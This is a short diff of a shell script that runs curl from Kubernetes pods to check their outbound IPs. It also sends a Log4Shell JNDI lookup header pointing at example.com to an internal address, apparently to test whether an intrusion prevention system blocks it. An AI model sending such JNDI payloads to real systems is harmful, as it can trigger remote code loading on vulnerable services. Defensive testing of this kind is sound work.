@@ -197,8 +197,9 @@ PODS=$(kubectl get pod -l app=web -o name)
 while true; do
   for P in $PODS; do echo $P; kubectl exec -it $P -- curl -m1 ip.iol.cz/ip/; echo; done
   for P in $PODS; do echo $P; kubectl exec -it $P -- curl -m1 ifconfig.me; echo; done
-  # log4j - IPS
   for P in $PODS; do echo $P; kubectl exec -it $P -- curl -m1 10.68.2.4  -H 'X-Log: ${jndi:ldap://example.com}'; echo; done
+  # log4j - IPS
+  #for P in $PODS; do echo $P; kubectl exec -it $P -- curl -m1 10.68.2.4  -H 'X-Log: ${jndi:ldap://example.com}'; echo; done
   sleep 2;
 done
 
